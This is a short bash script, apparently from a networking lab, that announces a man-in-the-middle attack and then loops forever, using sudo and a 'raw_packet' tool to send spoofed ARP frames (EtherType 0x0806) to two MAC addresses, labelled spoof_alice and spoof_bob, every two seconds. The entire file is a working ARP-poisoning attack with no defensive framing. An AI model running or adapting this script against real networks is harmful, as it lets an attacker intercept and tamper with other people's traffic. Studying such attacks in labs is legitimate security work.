#!/bin/bash
echo "Starting MITM Attack..."
while true; do
    sudo raw_packet eth1 02:42:0a:0a:31:02 0x0806 spoof_alice
    sudo raw_packet eth1 02:42:0a:0a:31:03 0x0806 spoof_bob
    sleep 2
done
